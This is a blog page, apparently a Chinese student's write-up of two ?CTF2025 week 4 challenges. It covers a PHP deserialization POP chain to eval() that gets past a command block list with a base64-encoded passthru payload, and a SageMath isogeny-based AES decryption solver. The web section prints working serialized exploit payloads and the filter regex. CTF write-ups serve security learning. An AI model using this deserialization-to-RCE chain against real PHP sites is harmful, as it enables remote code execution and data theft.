@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            ?CTF2025 week4部分WP
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="atom.xml" title="D'b8Gr的小站~" type="application/atom+xml">
+</head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">?CTF2025 week4部分WP</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2025-11-01
+                        </span>
+                        
+                            
+                                <span>
+                                    <i class="iconfont icon-browse"></i> 阅读：<span class="waline-pageview-count" data-path="/posts/4126005536/"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="waline-comment-count" data-path="/posts/4126005536/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                        
+                            <span class="category-color">CTF相关</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">比赛个人WP</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Week4-Path-to-Hero"><a href="#Week4-Path-to-Hero" class="headerlink" title="[Week4] Path to Hero"></a>[Week4] Path to Hero</h3><hr>
+<p>题目描述：初出茅庐的勇者啊，你能战胜魔王，得到至宝吗？</p>
+<hr>
+<p>打开靶机，观察前端显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line"></span><br><span class="line">Class Start</span><br><span class="line">&#123;</span><br><span class="line">    public $ishero;</span><br><span class="line">    public $adventure;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line"></span><br><span class="line">        if (strpos($this-&gt;ishero, &quot;hero&quot;) !== false &amp;&amp; $this-&gt;ishero !== &quot;hero&quot;) &#123;</span><br><span class="line">            echo &quot;&lt;br&gt;勇者啊，去寻找利刃吧&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            return $this-&gt;adventure-&gt;sword;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;前方的区域以后再来探索吧！&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sword		//MD5弱类型比较</span><br><span class="line">&#123;</span><br><span class="line">    public $test1;</span><br><span class="line">    public $test2;</span><br><span class="line">    public $go;</span><br><span class="line"></span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;test1 !== $this-&gt;test2 &amp;&amp; md5($this-&gt;test1) == md5($this-&gt;test2)) &#123;</span><br><span class="line">            echo &quot;沉睡的利刃被你唤醒了，是时候去讨伐魔王了！&lt;br&gt;&quot;;</span><br><span class="line">            echo $this-&gt;go;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Dead&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mon3tr</span><br><span class="line">&#123;</span><br><span class="line">    private $result;</span><br><span class="line">    public $end;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $result = new Treasure();</span><br><span class="line">        echo &quot;到此为止了！魔王&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        if (!preg_match(&quot;/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i&quot;, $this-&gt;end)) &#123;</span><br><span class="line">            $result-&gt;end($this-&gt;end);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;难道……要输了吗？&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Treasure</span><br><span class="line">&#123;</span><br><span class="line">    public function __call($name, $arg)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;结束了？&lt;br&gt;&quot;;</span><br><span class="line">        eval($arg[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;HERO&quot;])) &#123;</span><br><span class="line">    unserialize($_POST[&quot;HERO&quot;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到关键词<code>unserialize</code>以及魔术方法<code>_wakeup()、_toString()</code>得知，考察PHP的ROP链反序列化，</p>
+<p>第一个类<code>Start</code>，我们让<code>$adventrue</code>为一个<code>Sword</code>对象；</p>
+<p>第二个类<code>Sword</code>是典型的<strong>MD5弱类型比较(<code>==</code>比较哈希值)</strong>，我们只需让<code>$a = 240610708 &amp; $b = QNKCDZO</code>，MD5的值因为都以<code>0e</code>开头，被科学计数法处理为<code>0</code>，相等；</p>
+<p>第三个类<code>Mon3tr</code>考察<strong>黑名单绕过(正则过滤の绕过)</strong>，可以使用<code>base64编码</code>绕过；</p>
+<p>第四个类<code>Treasure</code>则考察<strong>RCE</strong>，任意代码执行。</p>
+<p>构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ishero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adventure</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mon3tr</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mon3tr</span> = <span class="keyword">new</span> <span class="title class_">Mon3tr</span>();</span><br><span class="line"><span class="variable">$mon3tr</span>-&gt;end = <span class="string">&quot;print_r(scandir(&#x27;/&#x27;));&quot;</span>;</span><br><span class="line"><span class="variable">$sword</span> = <span class="keyword">new</span> <span class="title class_">Sword</span>();</span><br><span class="line"><span class="variable">$sword</span>-&gt;test1 = <span class="string">&quot;240610708&quot;</span>;</span><br><span class="line"><span class="variable">$sword</span>-&gt;test2 = <span class="string">&quot;QNKCDZO&quot;</span>;</span><br><span class="line"><span class="variable">$sword</span>-&gt;go = <span class="variable">$mon3tr</span>;</span><br><span class="line"><span class="variable">$start</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$start</span>-&gt;ishero = <span class="string">&quot;herox&quot;</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;adventure = <span class="variable">$sword</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A22%3A%22print_r%28scandir%28%27%2F%27%29%29%3B%22%3B%7D%7D%7D</code></p>
+<p>先调用类似<code>ls /</code>命令查看文件夹，得到：</p>
+<p><img src="/images/week4_1.png" alt="week4_1"></p>
+<p>然后再用<code>eval()函数，再base64编码</code>，改<code>$mon3tr-&gt;end = &quot;print_r(scandir(&#39;/&#39;));&quot;;</code>为<code>$mon3tr-&gt;end = &quot;eval(base64_decode(&#39;cGFzc3RocnUoJ2NhdCAvZmxhZycpOw==&#39;));&quot;;</code>，执行php代码，得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A56%3A%22eval%28base64_decode%28%27cGFzc3RocnUoJ2NhdCAvZmxhZycpOw%3D%3D%27%29%29%3B%22%3B%7D%7D%7D</code>，</p>
+<p>POST请求，最终得到flag：flag{e24449c0-752e-42fe-8e9a-cff80fe7e221}</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Week4-Myneighbors"><a href="#Week4-Myneighbors" class="headerlink" title="[Week4] Myneighbors"></a>[Week4] Myneighbors</h3><hr>
+<p>题目描述：我是我的邻居？<a target="_blank" rel="noopener" href="https://eprint.iacr.org/2019/1321.pdf">https://eprint.iacr.org/2019/1321.pdf</a></p>
+<hr>
+<p>题目代码为sagemath格式的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> magical_num, flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">p = <span class="number">431</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus = x^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">E = EllipticCurve(j=F(magical_num))</span><br><span class="line"><span class="keyword">assert</span> E.is_supersingular()</span><br><span class="line"></span><br><span class="line">P = E(<span class="number">0</span>).division_points(<span class="number">2</span>)[<span class="number">1</span>:]</span><br><span class="line">neighbors = []</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>((P))):</span><br><span class="line">    phi = E.isogeny(P[idx])</span><br><span class="line">    EE = phi.codomain()</span><br><span class="line">    neighbors.append(EE.j_invariant())</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> E.j_invariant() <span class="keyword">in</span> neighbors</span><br><span class="line"></span><br><span class="line">P = E(<span class="number">0</span>).division_points(<span class="number">3</span>)[<span class="number">1</span>:]</span><br><span class="line">shuffle(P)</span><br><span class="line"></span><br><span class="line">phi = E.isogeny(P[<span class="number">0</span>])</span><br><span class="line">E = phi.codomain()</span><br><span class="line">H = hashlib.md5(<span class="built_in">str</span>(E.j_invariant()).encode()).hexdigest().encode()</span><br><span class="line">key, iv = H[:<span class="number">16</span>], H[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">cipher = aes.encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;cipher: <span class="subst">&#123;cipher.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#cipher: 49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>assert E.j_invariant() in neighbors</code>，E的<strong>j-invariant</strong>在自己的<strong>2-isogeny</strong>邻居中，</p>
+<p>同时，从题目给的文献里得知：</p>
+<ol>
+<li>在<code>2-isogeny</code>图中，每个<code>j-invariant</code>通常有<strong>3</strong>个邻居；</li>
+<li>特殊的<code>j-invariant</code>包括<code>p=431时，j 属于&#123;0, 2, 242&#125;</code>和<code>j=0&amp;&amp;j=242时，在图中有自环</code>。</li>
+</ol>
+<p>因此，我们的攻击思路为：</p>
+<ol>
+<li><code>magical_num</code>必须是有自环的；</li>
+<li>尝试<code>j 属于&#123;0, 242&#125;</code>;</li>
+<li>枚举所有可能的<code>3-isogeny</code>目标曲线；</li>
+<li>对<code>p=431</code>，每个曲线则有4个<code>3-isogeny</code>邻居。</li>
+</ol>
+<p>综上，EXP为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">p = <span class="number">431</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus = x^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">cipher_hex = <span class="string">&#x27;49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0&#x27;</span></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(cipher_hex)</span><br><span class="line">candidates = [F(<span class="number">0</span>), F(<span class="number">4</span>), F(<span class="number">242</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> magical_num <span class="keyword">in</span> candidates:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        E = EllipticCurve(j=magical_num)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> E.is_supersingular():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        P = E(<span class="number">0</span>).division_points(<span class="number">2</span>)[<span class="number">1</span>:]</span><br><span class="line">        neighbors = []</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P)):</span><br><span class="line">            phi = E.isogeny(P[idx])</span><br><span class="line">            EE = phi.codomain()</span><br><span class="line">            neighbors.append(EE.j_invariant())</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> E.j_invariant() <span class="keyword">not</span> <span class="keyword">in</span> neighbors:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found magical_num: <span class="subst">&#123;magical_num&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        P3 = E(<span class="number">0</span>).division_points(<span class="number">3</span>)[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">for</span> P_point <span class="keyword">in</span> P3:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                phi = E.isogeny(P_point)</span><br><span class="line">                E_new = phi.codomain()</span><br><span class="line">                j_inv = E_new.j_invariant()</span><br><span class="line">                H = hashlib.md5(<span class="built_in">str</span>(j_inv).encode()).hexdigest().encode()</span><br><span class="line">                key, iv = H[:<span class="number">16</span>], H[<span class="number">16</span>:]</span><br><span class="line">                aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    plaintext = unpad(aes.decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> plaintext <span class="keyword">or</span> <span class="string">b&#x27;FLAG&#123;&#x27;</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Success with j-invariant: <span class="subst">&#123;j_inv&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;plaintext.decode()&#125;</span>&quot;</span>)</span><br><span class="line">                        exit()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag not found - trying all j-invariants from the paper...&quot;</span>)</span><br><span class="line">all_j_invariants = [</span><br><span class="line">    F(<span class="number">0</span>), F(<span class="number">4</span>), F(<span class="number">316</span>), F(<span class="number">107</span>), F(<span class="number">419</span>), F(<span class="number">234</span>), F(<span class="number">102</span>), F(<span class="number">241</span>), F(<span class="number">143</span>), </span><br><span class="line">    F(<span class="number">358</span>), F(<span class="number">125</span>), F(<span class="number">19</span>), F(<span class="number">242</span>), F(<span class="number">61</span>), F(<span class="number">381</span>), F(<span class="number">319</span>), F(<span class="number">356</span>), F(<span class="number">150</span>), </span><br><span class="line">    F(<span class="number">422</span>), F(<span class="number">67</span>), F(<span class="number">189</span>),</span><br><span class="line">    F(<span class="number">81</span>*i + <span class="number">65</span>), F(<span class="number">67</span>*i + <span class="number">304</span>), F(<span class="number">350</span>*i + <span class="number">65</span>), F(<span class="number">132</span>*i + <span class="number">315</span>), F(<span class="number">125</span>*i + <span class="number">426</span>),</span><br><span class="line">    F(<span class="number">306</span>*i + <span class="number">426</span>), F(<span class="number">299</span>*i + <span class="number">315</span>), F(<span class="number">325</span>*i + <span class="number">379</span>), F(<span class="number">222</span>*i + <span class="number">118</span>), F(<span class="number">106</span>*i + <span class="number">379</span>),</span><br><span class="line">    F(<span class="number">42</span>*i + <span class="number">141</span>), F(<span class="number">209</span>*i + <span class="number">118</span>), F(<span class="number">389</span>*i + <span class="number">141</span>), F(<span class="number">364</span>*i + <span class="number">304</span>), F(<span class="number">344</span>*i + <span class="number">190</span>),</span><br><span class="line">    F(<span class="number">87</span>*i + <span class="number">190</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j_inv <span class="keyword">in</span> all_j_invariants:</span><br><span class="line">    H = hashlib.md5(<span class="built_in">str</span>(j_inv).encode()).hexdigest().encode()</span><br><span class="line">    key, iv = H[:<span class="number">16</span>], H[<span class="number">16</span>:]</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext = unpad(aes.decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> plaintext <span class="keyword">or</span> <span class="string">b&#x27;FLAG&#123;&#x27;</span> <span class="keyword">in</span> plaintext <span class="keyword">or</span> plaintext.startswith(<span class="string">b&#x27;flag&#x27;</span>) <span class="keyword">or</span> plaintext.isascii():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found with j-invariant: <span class="subst">&#123;j_inv&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;plaintext.decode()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#flag：flag&#123;I_@m_4_n31gh80r_0f_my53lf&#125;</span></span><br></pre></td></tr></table></figure>
+
+<!--more-->
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/static/avatar/avatar0.jpg" alt="D'b8Gr">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>D'b8Gr
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="" target="_blank">?CTF2025 week4部分WP</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>I hack,therefore I am.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="../../category/CTF%E7%9B%B8%E5%85%B3/">CTF相关</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="../../tag/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/">比赛个人WP</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="../2554455252/" class="prev-prefix">« </a> 上一篇：    <a href="../2554455252/" title="发布于 2025-11-05 12:00">PWN练习之ret2shellcode</a>
+                        <br>
+                    
+                    
+                        <a href="../3068727186/" class="next-prefix">» </a> 下一篇：    <a href="../3068727186/" title="发布于 2025-10-24 12:16">2025 XAUTCTF新生赛 rev&algo部分WP</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+    
+        <!-- 样式文件 -->
+        <link rel="stylesheet" href="/css/waline.css"/>
+        <link rel="stylesheet" href="/css/waline-custom.css"/>
+        <!-- 脚本文件 -->
+        <script type="module">
+            import { init } from "/js/waline.mjs";
+
+            const WalineInstance = init({
+                el              : ".comments-content",
+                serverURL       : "https://waline-pi-blue-88.vercel.app/",
+                path            : window.location.pathname,
+                meta            : ['nick', 'mail', 'link'],
+                requiredMeta    : ['nick', 'mail'],
+                pageSize        : 10,
+                lang            : "zh-cn",
+                locale: {
+                    admin       : "博主",
+                    anonymous   : "匿名用户",
+                    sofa        : "快来做第一个评论的人吧 ~",
+                    placeholder : "你是我一生只会遇见一次的惊喜...",
+                },
+                dark            : "html[color-scheme='dark']",
+                search          : false,
+                pageview        : true,
+                comment         : true,
+                copyright       : false,
+            });
+
+            // Waline 输入框选中动画
+            $(document).on("focus", ".wl-header-item .wl-input", function() {
+                $(this).parent().css("border-bottom-color", "var(--input-border-color-focus)");
+            });
+
